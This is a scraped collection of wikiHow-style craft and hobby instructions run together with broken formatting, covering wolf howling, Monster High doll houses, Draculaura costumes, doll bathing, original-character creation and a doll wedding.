Wolves howl to each other year-round. However, most packs do tend to howl more often in the winter than in the summer.

, Packs of wolves use a particular howling structure: the alpha wolf begins the howl with one high, piercing note, and then the rest of the wolves gradually join in with various low, mournful pitches. Wolves that howl alone are often trying to locate other members of their pack.

, Wolves are highly social creatures, and they are very good at pinpointing the origin of a howl. If you howl in the wild and there are wolves nearby, there is a good chance that they will come to you.If you don't want to encounter any wolves, consider leaving the area quickly.

, It will be much easier to imitate the howl if you know what it sounds like!, Inhale slowly and consistently until your lungs are completely full of air. You'll need a large volume of air to imitate the volume and duration of an actual wolf howl., Cup your hands around your mouth as if you are going to shout. Begin with a low, mournful note, and then quickly increase your pitch by one octave: ""A-woooooooooo!"" Build up the volume of the howl so that it grows louder and louder. Hold the howl for as long as you can – at least a few seconds. As you feel your breath waning, gradually low your pitch and ""fade out"" of the howl.


You can tell what a howl means by its pitch and strength. The longer the howl, the more powerful the emotion. Researchers also use pitch and volume to distinguish between individual wolves.

, Wolves rarely howl just once. If you want to imitate a wolf pack, then have several friends howl with you. Make sure that some of you howl in lower pitches, and some of you in higher pitches. Each wolf has a unique voice, and other wolves use these slight variations in pitch to identify who is howling."

Find an old Barbie house with three or more rooms.,
Put decorations of your choice along the wall.,
Put furniture and accessories of your choice in it.",How to Make a Monster High House1," If you don't have one, look in thrift stores or ask your parents to check out a site like Freecycle, where they can put a ""wanted"" post on.


Or, simply use a suitably sized grocery box. Glue in cardboard floors to make different levels. Or, use shoe boxes stacked up next to each other to create dividers inside a larger cardboard box. Glue it all in place so that nothing can wobble and fall out.;
, You might even like to repaint the house in colors you like or that you think suits the dolls.


Ask your parents for help in choosing the right paints for the material that your house is made from. And always paint somewhere that has plenty of air flow and where the work surface is well covered.

, You can either buy suitable furniture or make your own (see below for a bed example). Use cardboard boxes, containers, washed bottles, etc. to recycle into doll's furniture.

"
"
Find a suitable box.,
Make a mattress.,
Make sheets.,
Cut out a piece of felt, old wool fabric or similar for a blanket or duvet.,
Make a pillow.,
Make a sleeping mask or a little doll journal as an accessory.

",How to Make a Monster High House2," A shoe box is an ideal size, as long as it is large, such as at least size 13 for one doll.

,


Measure the box shape. Use this measurement to cut out 2 pieces of fabric slightly smaller than the box shape.
Stitch three sides of these two pieces together but leave open one end.
Stuff the fabric with quilt wadding or similar stuffing.
Stitch the last edge up and you have a mattress for the bed.

,


Grab any 2 sheets of fabric. Cut them down to fit the bed.
Tuck one piece of fabric over the mattress.
Use the other piece as the top sheet.

, Rest this on top of the bed.


It's a good idea to hem this piece to prevent fraying. If you don't know how, ask for help with this.

, Do the same as for making the mattress, only make the two pieces of fabric a lot smaller, pillow size for the box. Stuff and stitch up, then add to the bed.

If you don't want to change your hair color, buy a black wig. Draculaura's hair is wavy, not curly, so don't buy a wig with curls.
If your hair is already brown, or even blond, and you don't want to worry about making it black, you can still achieve Draculaura's look.;
, Draculaura accents her deep black hair with gorgeous pink or red streaks. She alternates streaks so that her hair actually looks like it is striped with equal parts black and pink.


Get temporary streaks or permanent streaks to look like Draculaura.
You can also get clip-in locks of pink or red hair that look like Draculaura's streaks.

, Draculaura has adorable bangs that are cut straight across just above her eyebrows. She wears them down, never swept to the side. Get a new haircut and ask your stylist to cut bangs, or cut your own at home.

, Draculaura's playful nature comes out in her trademark hairstyle, a pair of low, voluminous pigtails. Divide your hair into two sections with a part straight down the middle of your head. Use hairbands to secure the pigtails. Tease the hair right next to the hairband to make it look like it has more volume. Use a curling iron to curl the ends and make them flip like Draculaura's do.

, Draculaura has a pretty goth look, with pale skin, dark eyes, and pops of cheerful pink. Since Draculaura can't look at herself in mirrors, her makeup isn't always perfect, so don't stress too much about getting it just right!Here's how to create her look:


Give your skin a pale pink hue. Draculaura's skin is a pleasing pale pink. Use light pink blush on your face, neck and ears to mimic her vampirish look.
Wear bold eye makeup. Draculaura wears hot pink eye shadow, plenty of black eyeliner, and lots of mascara. Don't skimp when it comes to eye makeup - Draculaura's eyes really stand out.
Use hot pink lipstick. Pick out a bold, rich magenta color, and create a rosebud shape over your lips to make them pop.
Draw a pink heart on your cheek. Draculaura may be a monster, but she has a warm, sweet personality, symbolized by the heart on her cheek. Use hot pink lipstick or eyeliner to draw a little heart on your cheek like Draculaura's. You could also use a temporary heart tattoo.

, She is a vampire, after all! Get a pair of faux fangs and everyone you meet will know you're dressing as Draculaura.

, Draculaura wears a lot of gothic black - she is Dracula's daughter, after all - but she loves to accent it with hints of bright pink. Her clothes area always striking, but never severe, and they always have an element of playfulness.


Go for black tights and long-sleeved shirts with a hot pink vest or skirt.
Mix it up with a little purple and other shades of red and pink, but avoid blue, yellow, and other colors of the rainbow.

, Draculaura's tutu is her signature piece, and for good reason - it's adorable. Get a tutu with plenty of bounce, preferably with lace on the underside. Wear it with striped or solid black tights., Draculaura is almost 1,600 years old, so her taste in clothing is, shall we say, classic. She loves old-fashioned style elements like lacy skirts, button down ruffled blouses, high-collared shirts, and fishnets. Of course, she modernizes her style by adding sparkles, high heels, and plenty of magenta.

, Draculaura has high-heeled boots with laces running all the way up to the knees. Hers are hot pink, but you may have trouble finding them in stores. Wear black lace-up boots or buy a can of spray paint and add some hot pink flair.

, Draculaura can't go outside in the sun, so she carries around an umbrella to shield herself from strong rays. Find a frilly black umbrella and use pink spray paint to add some bright pink stripes.

, Draculaura loves long, dangly earrings and gothic-looking necklaces. Check out local thrift stores for some interesting ideas!

, Draculaura has the most unique accent in school, and if you want to emulate her persona, you should get one, too. Watch videos of draculaura online to get a sense of how she talks. Make sure you practice at home before you try it out at school.

, Draculaura is known for her bubbly, sweet, charming personality. She's always smiling and laughing, and she's very nice to her friends.

, Draculaura's most fun accessory is probably her pet bat, Count Fabulous. She dresses him up in a big pink bow and cute pink outfits to offset his black fur.

If you are giving a female doll a bath, then wash her hair.,
Detangle her hair with a wide-toothed comb.",How to Give a Monster High Doll a Bath," Remove every little bit of clothing, even shoes, earrings, and so on.

Now, when your doll is completely naked, place him/her on a towel while you run the bath.
To run the bath you will need an area to fill up with water, so a sink will be best for a MH doll.
Run warm water into the bath/sink and keep it going until the sink is almost full.
Mix in some cold so the water is even.
If you are not in a hurry and you really want to pamper your doll, then why not pour some bubble-bath in? (Trust me- your doll will love you forever);
, If you are bathing Lagoona, then let her swim about a bit. (And even better, if you have Neptuna, she can be bathed too).

When your doll is done swimming, get a sponge and a little bar of soap and just rub a little amount of soap onto the sponge.
Make sure you mix lots of water in the sponge, before gently scrubbing your doll, removing dirty marks.

, If her hair is really long, like Abbey, Spectra or Lagoona, or even Rochelle, then use conditioner.

Get some shampoo, and rub a very small amount of shampoo onto her hair.
Massage it in for a little while, then rinse it off.
Make sure every sud is gone, before taking her out of the 'bath' and placing onto a big, fluffy towel.
Unplug the sink and let the water drain out, whilst drying him or her.
Make sure you dry all the bits between the legs, arms and, yes... Bottom... Then, if your doll is a girl and you washed her hair, dry it a little.

, then give her hair a quick rubbing, dress him or her again, and then, well done! You have just bathed your doll!"

Determine the gender of your OC.,
Select a monster.,
Keep in mind family background, ties and relationships.,
Decide on a body type for your OC.,
Design your characters clothes.,
Choose a skin color for your OC.,
Name your monster!,
Decide on the type of hair your monster will have: highlights, length, color, cut, etc.,
Design your monster's computer graphic.,
Make sure you are not copying or plagiarizing another person's monster.,
Think about what kind of personality your OC will have, which is actually a bit more important than their appearance.,
Upload your OC to the internet and start playing.",How to Create a Monster High Original Character," Sugar, spice and everything nice--or not.;
, What monster do you want your OC to be child of? Some good examples are a dragon, were-animals, or even a sphynx. It's not very believable to use silly things like My Little Pony characters or stereotypes (like gypsies or fortune tellers) as monster parents. Also, try to avoid making your character sister/brother/cousin/etc. to a cannon character, such as Draculaura or Toralei. Most who try this end up making carbon copies of the canon character instead of a their own on unique character.

, After finding a good monster parent, make sure you have all the needed information to create a solid OC. Are they the child of a single parent? Is their family large? And so on. This can help shape the OC's personality.

, We all know Monster High style tends to lean toward the slender body shape. This is fine if your OC goes along with this, but don't take this as a rule. Just because the canon characters are all the same size does not mean you can't make your OC have a different body type. Think about what type of monster your character is. Don't be afraid to try something different for the sake of creativity! Click here for body charts of all types!

, Be sure to pick reasonable colors. Think about the character's personality and origins. Where they come from and is there a specific type of outfit or style they are required to wear? Think about what makes sense in regards to the character you're creating. A mermaid wearing starfish clips in her hair would make sense, for example. However, a dragon girl who wears starfish clips just makes no sense. You get the idea.

, When choosing colors for skin, remember the great thing about skin on Monsters is that it can be any color. Remember with skin color, try not to go too extreme! Use the golden rule: match it with its monster. If you had a werecat, you wouldn't give it purple skin, because cats aren't purple.

, Make sure that the monster's name makes sense with the monster type. You wouldn't name Daughter of the Ice Sprite ""Flama Blaze""! If you're having trouble coming up with a punny, Monster High-ish name, try going a different route and thinking of the character's strongest personality or physical quality. Then google a name which means that word. For example, a character who is a gray colored robot could be named Lloyd since that name means ""gray"". Of course you can always just choose a name because it fits how the character looks, or you just like a certain name!

, When designing hair,you need to keep in mind your OC's scheme and monster origins. If they are pulling their look from a certain time period, for example the 60's, make sure to study up on hairstyles of that era. Think about how you want the hair to look. Straight? Curly? Wavy? Perhaps straight at the root and curly at the ends? The possibilities are endless! Don't be afraid to experiment! Dreadlocks, braids, cornrows, French braids, spiked, shaved, Mohawks, the list goes on. When choosing a color for your OC's hair, think about what looks good with their clothing color scheme. This is your OC and therefore, your choice completely! With hair it's pretty much anything goes. If they are a plant-based character then why not make them grow leaves along with their hair? The only real rule here is to stay with your character's personality! You would not give a quiet, book-loving mouse girl a big red Mohawk. It might look cool but does it make sense? Nope.

, Consider whether you want to use bases or not. Bases are a touchy subject. Why? Well they are a lot like a power switch with two settings. One is 'pleasantly helpful' and the other is 'extremely dangerous'. There is also a fine line between these two settings. What does this mean? Well, dear artist, this means that bases are supposed to be used as an aid. Getting the correct proportion and/or anatomy of the Monster High style is the wisest way to use a base. This is not always an easy task to do; sad but true. Of course, if one is determined enough it can be done! A base is 'dangerous' to an artist only when one uses it incorrectly. Many MH bases and character 'lineart' is saved as what it called a PNG file. When someone tries to color these in the art program such as Microsoft Paint, using the fill bucket or brush tools, it creates a messy, pixelated and ugly look which takes away from the original idea you had for you OC. It is scary, but in all honesty, it is far, far, far, far better to try to draw your OC by yourself without using a base. It's okay if you are not a great drawer. Many in the MH fandom also have no confidence in their drawing ability but use bases and use them incorrectly. It is far better to to draw the OC yourself because it is completely your creation and you don't have to link back to a base maker or worry about anything like that! Don't panic just yet! There are some helpful links below in the ""Tips"" section so hold on tight! To the right is a prime example of a misused base. This is commonly seen in the fandom but that doesn't mean it's okay or that it's right. While this is an example of what not to do, please understand that this is not to make fun of anyone's art skill. This is to showcase how bad it looks when someone misuses a base by using the wrong art program and/or tools. The coloring and line work is sloppy and no real time or care was put into it.

, So you've got your OC and they got the perfect, hair, fantastic color scheme and so on. They're all set right? Wrong! Keep in mind the important magical word 'plagiarism'. Plagiarism, or copying, is when you steal or ""borrow"" something from someone and claim it as your own creation (and naturally, it is illegal). Bases count as plagiarism, believe it or not! Even if you've made an OC, and it it originally yours you still have to think about plagiarism. Take a look at the other characters in the fandom. Sure, there may be children of the same monster parent that you chose but if you ever find a character extremely similar to the one you have just created, then its time to erase and re-write. This meaning, you have to avoid being accused of plagiarism by making sure any and all strong similarities are destroyed between your OC and another person's. Even if it is unintentional and you did not purposely ""copy"" the person. Now, this doesn't mean just because your OC and someone else's OC both hate math class, that it's plagiarism. In the image, it clearly demonstrates what this crime looks like. More information can be found here.

, Sure they have to look cool and freaky fab but in reality, how one thinks determines how one dresses and acts. A very, very, very, extremely common issue with artists who are new to creating characters is that they make what is called a ""Mary Sue"" or ""Gary Stu"". Be sure to learn how this immediately ruins a character, no matter how cool, pretty, cute or handsome they look. (please note that there is further information and links to helpful sites below!)

, So now that you've scoped the scene and have your horrifically wonderful OC all geared up and rearing to go you're probably ready to get the show on the road! As ""easy"" and ""cookie cutter"" as making an OC may seem, it's actually a very time consuming and intricate process which involves a lot of emotion, time, passion and care. Your OC is your baby. They do not just pop out of the womb and know how to walk, talk, and feed themselves. This means, that you cannot just shove your OC into the Monster High universe and let them waddle around until they find a love interest and cling. Let the character stand on their own for at least the first month or so of role playing and do not, do not immediately hook your OC up with another OC! The temptation is strong and like any proud parent, you will want your baby to fall in love but if it happens too quickly, it can basically ruin the character. Please, please refrain from giving your OC's ""cupid syndrome"".

Decorate the space with pretty things such as bows, tinsel, glitter, flowers, lace, paper decorations and so forth, to make it look like a wedding space. Look at pictures of weddings online to be inspired.
Set up seating for the dolls and toys attending the party. Use boxes or just imaginary seats in an area set aside for this.

, Say some nice words to join the two dolls in marriage. You can make these up or copy the words from real weddings––search online for the right words.
